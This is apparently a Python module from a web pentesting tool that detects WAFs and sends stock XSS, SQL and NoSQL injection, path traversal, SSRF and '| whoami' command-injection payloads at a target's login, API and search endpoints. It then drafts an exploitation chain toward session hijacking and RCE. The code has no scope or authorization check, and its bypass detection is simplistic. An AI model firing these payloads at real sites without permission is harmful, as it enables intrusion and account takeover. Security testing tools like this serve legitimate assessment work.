"""
Advanced Web Pentesting Module

This module provides sophisticated web application security testing capabilities
including WAF bypass, authentication bypass, API security testing, client-side
security testing, and custom exploitation chains.
"""

import asyncio
import json
import re
import base64
import hashlib
import hmac
import time
import random
import string
from typing import Dict, List, Any, Optional, Union, Tuple
from dataclasses import dataclass
from enum import Enum
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import aiohttp
import requests
from pydantic import BaseModel, Field
import logging

from app.security.burp_client import BurpClient
from app.security.mcp_client import MCPClient
from app.core.config import settings

logger = logging.getLogger(__name__)


class WAFType(Enum):
    """Types of Web Application Firewalls"""
    CLOUDFLARE = "cloudflare"
    AWS_WAF = "aws_waf"
    AZURE_WAF = "azure_waf"
    MODSECURITY = "modsecurity"
    F5_BIG_IP = "f5_big_ip"
    IMPERVA = "imperva"
    AKAMAI = "akamai"
    UNKNOWN = "unknown"


class AuthBypassType(Enum):
    """Types of Authentication Bypass techniques"""
    SQL_INJECTION = "sql_injection"
    NO_SQL_INJECTION = "no_sql_injection"
    LDAP_INJECTION = "ldap_injection"
    JWT_MANIPULATION = "jwt_manipulation"
    SESSION_HIJACKING = "session_hijacking"
    IDOR = "idor"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    OAUTH_BYPASS = "oauth_bypass"


class APISecurityTest(Enum):
    """Types of API Security Tests"""
    RATE_LIMITING = "rate_limiting"
    INPUT_VALIDATION = "input_validation"
    AUTHENTICATION = "authentication"
    AUTHORIZATION = "authorization"
    DATA_EXPOSURE = "data_exposure"
    MASS_ASSIGNMENT = "mass_assignment"
    INJECTION = "injection"
    BUSINESS_LOGIC = "business_logic"


@dataclass
class WAFBypassPayload:
    """WAF bypass payload with metadata"""
    payload: str
    technique: str
    description: str
    success_rate: float
    waf_types: List[WAFType]
    encoding_methods: List[str]
    tags: List[str]


@dataclass
class AuthBypassTechnique:
    """Authentication bypass technique"""
    name: str
    description: str
    payloads: List[str]
    success_indicators: List[str]
    risk_level: str
    mitigation: str


class AdvancedWebPentesting:
    """Advanced web application security testing capabilities"""
    
    def __init__(self):
        self.burp_client = None
        self.mcp_client = None
        self.waf_bypass_payloads = self._load_waf_bypass_payloads()
        self.auth_bypass_techniques = self._load_auth_bypass_techniques()
        self.api_security_tests = self._load_api_security_tests()
        self.session = None
        
    async def __aenter__(self):
        """Async context manager entry"""
        self.session = aiohttp.ClientSession()
        if settings.mcp_enabled:
            self.mcp_client = MCPClient(settings.mcp_server_url, settings.mcp_api_key)
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit"""
        if self.session:
            await self.session.close()
    
    def _load_waf_bypass_payloads(self) -> List[WAFBypassPayload]:
        """Load WAF bypass payloads"""
        return [
            WAFBypassPayload(
                payload="<script>alert(1)</script>",
                technique="Basic XSS",
                description="Standard XSS payload",
                success_rate=0.1,
                waf_types=[WAFType.CLOUDFLARE, WAFType.AWS_WAF, WAFType.MODSECURITY],
                encoding_methods=["url", "html", "hex"],
                tags=["xss", "basic"]
            ),
            WAFBypassPayload(
                payload="<svg/onload=alert(1)>",
                technique="SVG XSS",
                description="SVG-based XSS payload",
                success_rate=0.3,
                waf_types=[WAFType.CLOUDFLARE, WAFType.AWS_WAF],
                encoding_methods=["url", "html"],
                tags=["xss", "svg"]
            ),
            WAFBypassPayload(
                payload="<img src=x onerror=alert(1)>",
                technique="Image Error XSS",
                description="Image error-based XSS",
                success_rate=0.4,
                waf_types=[WAFType.CLOUDFLARE, WAFType.MODSECURITY],
                encoding_methods=["url", "html", "base64"],
                tags=["xss", "image"]
            ),
            WAFBypassPayload(
                payload="javascript:alert(1)",
                technique="JavaScript Protocol",
                description="JavaScript protocol handler",
                success_rate=0.2,
                waf_types=[WAFType.AWS_WAF, WAFType.AKAMAI],
                encoding_methods=["url", "hex"],
                tags=["xss", "protocol"]
            ),
            WAFBypassPayload(
                payload="' OR 1=1--",
                technique="SQL Injection",
                description="Basic SQL injection",
                success_rate=0.1,
                waf_types=[WAFType.CLOUDFLARE, WAFType.MODSECURITY],
                encoding_methods=["url", "hex", "unicode"],
                tags=["sql", "basic"]
            ),
            WAFBypassPayload(
                payload="' UNION SELECT NULL--",
                technique="Union SQL Injection",
                description="Union-based SQL injection",
                success_rate=0.05,
                waf_types=[WAFType.CLOUDFLARE, WAFType.AWS_WAF],
                encoding_methods=["url", "hex", "unicode"],
                tags=["sql", "union"]
            ),
            WAFBypassPayload(
                payload="../../etc/passwd",
                technique="Path Traversal",
                description="Directory traversal",
                success_rate=0.2,
                waf_types=[WAFType.CLOUDFLARE, WAFType.MODSECURITY],
                encoding_methods=["url", "hex", "unicode"],
                tags=["lfi", "path"]
            ),
            WAFBypassPayload(
                payload="http://internal-service",
                technique="SSRF",
                description="Server-side request forgery",
                success_rate=0.15,
                waf_types=[WAFType.AWS_WAF, WAFType.AKAMAI],
                encoding_methods=["url", "hex"],
                tags=["ssrf", "internal"]
            )
        ]
    
    def _load_auth_bypass_techniques(self) -> List[AuthBypassTechnique]:
        """Load authentication bypass techniques"""
        return [
            AuthBypassTechnique(
                name="SQL Injection Auth Bypass",
                description="Bypass authentication using SQL injection",
                payloads=[
                    "' OR '1'='1",
                    "' OR 1=1--",
                    "admin'--",
                    "admin'/*",
                    "' UNION SELECT 'admin','password'--"
                ],
                success_indicators=[
                    "Welcome admin",
                    "Dashboard",
                    "Logout button",
                    "User profile"
                ],
                risk_level="High",
                mitigation="Use parameterized queries and input validation"
            ),
            AuthBypassTechnique(
                name="NoSQL Injection Auth Bypass",
                description="Bypass authentication using NoSQL injection",
                payloads=[
                    '{"$ne": null}',
                    '{"$gt": ""}',
                    '{"$regex": ".*"}',
                    '{"$where": "1==1"}'
                ],
                success_indicators=[
                    "Authentication successful",
                    "User session created",
                    "Access granted"
                ],
                risk_level="High",
                mitigation="Use proper input validation and sanitization"
            ),
            AuthBypassTechnique(
                name="JWT Manipulation",
                description="Manipulate JWT tokens to bypass authentication",
                payloads=[
                    "none",
                    "HS256",
                    "RS256"
                ],
                success_indicators=[
                    "Valid token",
                    "Access granted",
                    "User authenticated"
                ],
                risk_level="Medium",
                mitigation="Validate JWT signatures and algorithms"
            ),
            AuthBypassTechnique(
                name="Session Hijacking",
                description="Hijack user sessions",
                payloads=[
                    "session_id=123456",
                    "PHPSESSID=abc123",
                    "JSESSIONID=xyz789"
                ],
                success_indicators=[
                    "User session active",
                    "Logged in as user",
                    "Session valid"
                ],
                risk_level="High",
                mitigation="Use secure session management and HTTPS"
            )
        ]
    
    def _load_api_security_tests(self) -> Dict[str, List[str]]:
        """Load API security test payloads"""
        return {
            "rate_limiting": [
                "Rapid requests",
                "Burst requests",
                "Distributed requests"
            ],
            "input_validation": [
                "SQL injection",
                "XSS payloads",
                "Command injection",
                "Path traversal"
            ],
            "authentication": [
                "Missing tokens",
                "Invalid tokens",
                "Expired tokens",
                "Weak tokens"
            ],
            "authorization": [
                "Privilege escalation",
                "IDOR attacks",
                "Role manipulation"
            ],
            "data_exposure": [
                "Sensitive data in responses",
                "Error information disclosure",
                "Debug information"
            ],
            "mass_assignment": [
                "Additional fields",
                "Nested objects",
                "Array manipulation"
            ],
            "injection": [
                "SQL injection",
                "NoSQL injection",
                "Command injection"
            ],
            "business_logic": [
                "Race conditions",
                "Time-based attacks",
                "Logic flaws"
            ]
        }
    
    async def detect_waf(self, target_url: str) -> WAFType:
        """Detect WAF type using various techniques"""
        try:
            # Test with known WAF signatures
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            async with self.session.get(target_url, headers=headers) as response:
                response_headers = response.headers
                
                # Check for WAF signatures in headers
                if 'cf-ray' in response_headers or 'cloudflare' in response_headers.get('server', '').lower():
                    return WAFType.CLOUDFLARE
                elif 'x-amz-cf-id' in response_headers:
                    return WAFType.AWS_WAF
                elif 'x-azure-ref' in response_headers:
                    return WAFType.AZURE_WAF
                elif 'mod_security' in response_headers.get('server', '').lower():
                    return WAFType.MODSECURITY
                elif 'bigip' in response_headers.get('server', '').lower():
                    return WAFType.F5_BIG_IP
                elif 'incap_ses' in response_headers:
                    return WAFType.IMPERVA
                elif 'x-akamai-transformed' in response_headers:
                    return WAFType.AKAMAI
                
                # Test with malicious payload to trigger WAF
                test_payload = "<script>alert(1)</script>"
                test_url = f"{target_url}?test={test_payload}"
                
                async with self.session.get(test_url, headers=headers) as test_response:
                    if test_response.status in [403, 406, 429]:
                        # WAF detected but type unknown
                        return WAFType.UNKNOWN
                    
                    # Check response content for WAF indicators
                    content = await test_response.text()
                    if 'cloudflare' in content.lower():
                        return WAFType.CLOUDFLARE
                    elif 'aws' in content.lower():
                        return WAFType.AWS_WAF
                    elif 'mod_security' in content.lower():
                        return WAFType.MODSECURITY
                
                return WAFType.UNKNOWN
                
        except Exception as e:
            logger.error(f"Error detecting WAF: {e}")
            return WAFType.UNKNOWN
    
    async def test_waf_bypass(self, target_url: str, waf_type: WAFType = None) -> List[Dict[str, Any]]:
        """Test WAF bypass techniques"""
        if not waf_type:
            waf_type = await self.detect_waf(target_url)
        
        results = []
        
        # Filter payloads for the detected WAF type
        relevant_payloads = [
            payload for payload in self.waf_bypass_payloads
            if waf_type in payload.waf_types or waf_type == WAFType.UNKNOWN
        ]
        
        for payload in relevant_payloads:
            for encoding in payload.encoding_methods:
                encoded_payload = self._encode_payload(payload.payload, encoding)
                
                try:
                    test_url = f"{target_url}?test={encoded_payload}"
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    }
                    
                    async with self.session.get(test_url, headers=headers) as response:
                        result = {
                            'payload': payload.payload,
                            'encoded_payload': encoded_payload,
                            'technique': payload.technique,
                            'encoding': encoding,
                            'status_code': response.status,
                            'response_size': len(await response.text()),
                            'waf_detected': response.status in [403, 406, 429],
                            'bypass_successful': response.status == 200,
                            'description': payload.description
                        }
                        results.append(result)
                        
                except Exception as e:
                    logger.error(f"Error testing WAF bypass: {e}")
                    results.append({
                        'payload': payload.payload,
                        'encoded_payload': encoded_payload,
                        'technique': payload.technique,
                        'encoding': encoding,
                        'error': str(e),
                        'bypass_successful': False
                    })
        
        return results
    
    def _encode_payload(self, payload: str, encoding: str) -> str:
        """Encode payload using specified method"""
        if encoding == "url":
            return requests.utils.quote(payload)
        elif encoding == "html":
            return payload.replace('<', '&lt;').replace('>', '&gt;')
        elif encoding == "hex":
            return ''.join([hex(ord(c))[2:] for c in payload])
        elif encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif encoding == "unicode":
            return ''.join([f'%u00{ord(c):02x}' for c in payload])
        else:
            return payload
    
    async def test_auth_bypass(self, target_url: str, login_endpoint: str = None) -> List[Dict[str, Any]]:
        """Test authentication bypass techniques"""
        if not login_endpoint:
            login_endpoint = f"{target_url}/login"
        
        results = []
        
        for technique in self.auth_bypass_techniques:
            for payload in technique.payloads:
                try:
                    # Test different injection points
                    injection_points = ['username', 'email', 'user', 'login']
                    
                    for point in injection_points:
                        data = {point: payload}
                        
                        async with self.session.post(login_endpoint, data=data) as response:
                            content = await response.text()
                            
                            # Check for success indicators
                            success = any(indicator.lower() in content.lower() 
                                        for indicator in technique.success_indicators)
                            
                            result = {
                                'technique': technique.name,
                                'payload': payload,
                                'injection_point': point,
                                'status_code': response.status,
                                'success': success,
                                'response_preview': content[:200],
                                'risk_level': technique.risk_level,
                                'mitigation': technique.mitigation
                            }
                            results.append(result)
                            
                except Exception as e:
                    logger.error(f"Error testing auth bypass: {e}")
                    results.append({
                        'technique': technique.name,
                        'payload': payload,
                        'error': str(e),
                        'success': False
                    })
        
        return results
    
    async def test_api_security(self, api_endpoint: str, method: str = "GET") -> Dict[str, List[Dict[str, Any]]]:
        """Test API security vulnerabilities"""
        results = {}
        
        for test_type, test_methods in self.api_security_tests.items():
            results[test_type] = []
            
            if test_type == "rate_limiting":
                # Test rate limiting
                for i in range(100):  # Rapid requests
                    try:
                        async with self.session.request(method, api_endpoint) as response:
                            if response.status == 429:  # Rate limited
                                results[test_type].append({
                                    'test': 'Rapid requests',
                                    'status_code': response.status,
                                    'rate_limited': True,
                                    'request_count': i + 1
                                })
                                break
                    except Exception as e:
                        logger.error(f"Rate limiting test error: {e}")
            
            elif test_type == "input_validation":
                # Test input validation
                test_payloads = [
                    "' OR 1=1--",
                    "<script>alert(1)</script>",
                    "../../etc/passwd",
                    "| whoami"
                ]
                
                for payload in test_payloads:
                    try:
                        if method == "GET":
                            test_url = f"{api_endpoint}?param={payload}"
                            async with self.session.get(test_url) as response:
                                content = await response.text()
                                results[test_type].append({
                                    'payload': payload,
                                    'status_code': response.status,
                                    'vulnerable': self._check_vulnerability(content, payload),
                                    'response_preview': content[:200]
                                })
                        else:
                            data = {"param": payload}
                            async with self.session.post(api_endpoint, json=data) as response:
                                content = await response.text()
                                results[test_type].append({
                                    'payload': payload,
                                    'status_code': response.status,
                                    'vulnerable': self._check_vulnerability(content, payload),
                                    'response_preview': content[:200]
                                })
                    except Exception as e:
                        logger.error(f"Input validation test error: {e}")
            
            elif test_type == "authentication":
                # Test authentication
                auth_tests = [
                    {"headers": {}},  # No auth
                    {"headers": {"Authorization": "Bearer invalid"}},  # Invalid token
                    {"headers": {"Authorization": "Bearer expired.token.here"}},  # Expired token
                ]
                
                for test in auth_tests:
                    try:
                        async with self.session.request(method, api_endpoint, **test) as response:
                            results[test_type].append({
                                'test': str(test),
                                'status_code': response.status,
                                'unauthorized_access': response.status == 200,
                                'response_preview': (await response.text())[:200]
                            })
                    except Exception as e:
                        logger.error(f"Authentication test error: {e}")
        
        return results
    
    def _check_vulnerability(self, content: str, payload: str) -> bool:
        """Check if response indicates vulnerability"""
        # Check for SQL error messages
        sql_errors = [
            "sql syntax", "mysql error", "oracle error", "sqlite error",
            "postgresql error", "microsoft ole db provider"
        ]
        
        # Check for XSS reflection
        if payload in content:
            return True
        
        # Check for SQL errors
        if any(error in content.lower() for error in sql_errors):
            return True
        
        # Check for command injection
        if "uid=" in content and "gid=" in content:
            return True
        
        return False
    
    async def test_client_side_security(self, target_url: str) -> Dict[str, Any]:
        """Test client-side security vulnerabilities"""
        results = {
            'xss_vulnerabilities': [],
            'csp_bypass': [],
            'javascript_injection': [],
            'dom_based_vulnerabilities': []
        }
        
        # Test for XSS vulnerabilities
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>"
        ]
        
        for payload in xss_payloads:
            try:
                # Test in URL parameters
                test_url = f"{target_url}?q={payload}"
                async with self.session.get(test_url) as response:
                    content = await response.text()
                    
                    if payload in content:
                        results['xss_vulnerabilities'].append({
                            'payload': payload,
                            'injection_point': 'URL parameter',
                            'reflected': True,
                            'url': test_url
                        })
                
                # Test in form data
                data = {"search": payload}
                async with self.session.post(target_url, data=data) as response:
                    content = await response.text()
                    
                    if payload in content:
                        results['xss_vulnerabilities'].append({
                            'payload': payload,
                            'injection_point': 'Form data',
                            'reflected': True
                        })
                        
            except Exception as e:
                logger.error(f"Client-side security test error: {e}")
        
        # Test CSP bypass
        try:
            async with self.session.get(target_url) as response:
                csp_header = response.headers.get('content-security-policy', '')
                
                if csp_header:
                    # Check for weak CSP policies
                    if "'unsafe-inline'" in csp_header:
                        results['csp_bypass'].append({
                            'issue': 'Unsafe inline allowed',
                            'csp_header': csp_header,
                            'risk': 'High'
                        })
                    
                    if "'unsafe-eval'" in csp_header:
                        results['csp_bypass'].append({
                            'issue': 'Unsafe eval allowed',
                            'csp_header': csp_header,
                            'risk': 'High'
                        })
                else:
                    results['csp_bypass'].append({
                        'issue': 'No CSP header',
                        'risk': 'High'
                    })
                    
        except Exception as e:
            logger.error(f"CSP test error: {e}")
        
        return results
    
    async def create_exploitation_chain(self, target_url: str, vulnerabilities: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Create custom exploitation chain based on discovered vulnerabilities"""
        chain = {
            'target_url': target_url,
            'vulnerabilities': vulnerabilities,
            'exploitation_steps': [],
            'success_probability': 0.0,
            'risk_level': 'Unknown'
        }
        
        # Analyze vulnerabilities and create chain
        for vuln in vulnerabilities:
            if vuln.get('type') == 'sql_injection':
                chain['exploitation_steps'].append({
                    'step': 1,
                    'technique': 'SQL Injection',
                    'payload': vuln.get('payload', ''),
                    'description': 'Extract database information',
                    'next_steps': ['Data extraction', 'Privilege escalation']
                })
            
            elif vuln.get('type') == 'xss':
                chain['exploitation_steps'].append({
                    'step': 2,
                    'technique': 'XSS',
                    'payload': vuln.get('payload', ''),
                    'description': 'Steal user sessions',
                    'next_steps': ['Session hijacking', 'Account takeover']
                })
            
            elif vuln.get('type') == 'lfi':
                chain['exploitation_steps'].append({
                    'step': 3,
                    'technique': 'LFI',
                    'payload': vuln.get('payload', ''),
                    'description': 'Read sensitive files',
                    'next_steps': ['File inclusion', 'RCE via log poisoning']
                })
        
        # Calculate success probability
        if len(chain['exploitation_steps']) > 0:
            chain['success_probability'] = min(0.9, len(chain['exploitation_steps']) * 0.3)
            chain['risk_level'] = 'High' if chain['success_probability'] > 0.6 else 'Medium'
        
        return chain
    
    async def run_comprehensive_web_pentest(self, target_url: str) -> Dict[str, Any]:
        """Run comprehensive web application penetration test"""
        results = {
            'target_url': target_url,
            'timestamp': time.time(),
            'waf_detection': None,
            'waf_bypass_tests': [],
            'auth_bypass_tests': [],
            'api_security_tests': {},
            'client_side_tests': {},
            'exploitation_chain': None,
            'summary': {}
        }
        
        try:
            # 1. WAF Detection and Bypass
            logger.info("Detecting WAF...")
            waf_type = await self.detect_waf(target_url)
            results['waf_detection'] = waf_type.value
            
            logger.info("Testing WAF bypass techniques...")
            results['waf_bypass_tests'] = await self.test_waf_bypass(target_url, waf_type)
            
            # 2. Authentication Bypass
            logger.info("Testing authentication bypass...")
            results['auth_bypass_tests'] = await self.test_auth_bypass(target_url)
            
            # 3. API Security Testing
            logger.info("Testing API security...")
            api_endpoints = [
                f"{target_url}/api/users",
                f"{target_url}/api/admin",
                f"{target_url}/api/data"
            ]
            
            for endpoint in api_endpoints:
                try:
                    api_results = await self.test_api_security(endpoint)
                    results['api_security_tests'][endpoint] = api_results
                except Exception as e:
                    logger.error(f"API security test failed for {endpoint}: {e}")
            
            # 4. Client-side Security
            logger.info("Testing client-side security...")
            results['client_side_tests'] = await self.test_client_side_security(target_url)
            
            # 5. Create Exploitation Chain
            logger.info("Creating exploitation chain...")
            all_vulnerabilities = []
            
            # Collect vulnerabilities from all tests
            for bypass_test in results['waf_bypass_tests']:
                if bypass_test.get('bypass_successful'):
                    all_vulnerabilities.append({
                        'type': 'waf_bypass',
                        'payload': bypass_test['payload'],
                        'technique': bypass_test['technique']
                    })
            
            for auth_test in results['auth_bypass_tests']:
                if auth_test.get('success'):
                    all_vulnerabilities.append({
                        'type': 'auth_bypass',
                        'payload': auth_test['payload'],
                        'technique': auth_test['technique']
                    })
            
            results['exploitation_chain'] = await self.create_exploitation_chain(target_url, all_vulnerabilities)
            
            # 6. Generate Summary
            results['summary'] = self._generate_summary(results)
            
        except Exception as e:
            logger.error(f"Comprehensive web pentest failed: {e}")
            results['error'] = str(e)
        
        return results
    
    def _generate_summary(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Generate summary of pentest results"""
        summary = {
            'total_vulnerabilities': 0,
            'high_risk_vulnerabilities': 0,
            'medium_risk_vulnerabilities': 0,
            'low_risk_vulnerabilities': 0,
            'waf_detected': results['waf_detection'] != 'unknown',
            'auth_bypass_possible': False,
            'api_vulnerabilities': 0,
            'client_side_vulnerabilities': 0,
            'recommendations': []
        }
        
        # Count vulnerabilities
        if results['waf_bypass_tests']:
            successful_bypasses = sum(1 for test in results['waf_bypass_tests'] if test.get('bypass_successful'))
            summary['total_vulnerabilities'] += successful_bypasses
            summary['high_risk_vulnerabilities'] += successful_bypasses
        
        if results['auth_bypass_tests']:
            successful_auth_bypasses = sum(1 for test in results['auth_bypass_tests'] if test.get('success'))
            summary['total_vulnerabilities'] += successful_auth_bypasses
            summary['high_risk_vulnerabilities'] += successful_auth_bypasses
            summary['auth_bypass_possible'] = successful_auth_bypasses > 0
        
        # Count API vulnerabilities
        for endpoint, tests in results['api_security_tests'].items():
            for test_type, test_results in tests.items():
                summary['api_vulnerabilities'] += len(test_results)
        
        # Count client-side vulnerabilities
        if results['client_side_tests']:
            summary['client_side_vulnerabilities'] = len(results['client_side_tests'].get('xss_vulnerabilities', []))
            summary['total_vulnerabilities'] += summary['client_side_vulnerabilities']
            summary['medium_risk_vulnerabilities'] += summary['client_side_vulnerabilities']
        
        # Generate recommendations
        if summary['waf_detected']:
            summary['recommendations'].append("Implement proper WAF rules and monitoring")
        
        if summary['auth_bypass_possible']:
            summary['recommendations'].append("Strengthen authentication mechanisms")
        
        if summary['api_vulnerabilities'] > 0:
            summary['recommendations'].append("Implement proper API security controls")
        
        if summary['client_side_vulnerabilities'] > 0:
            summary['recommendations'].append("Implement Content Security Policy and input validation")
        
        return summary
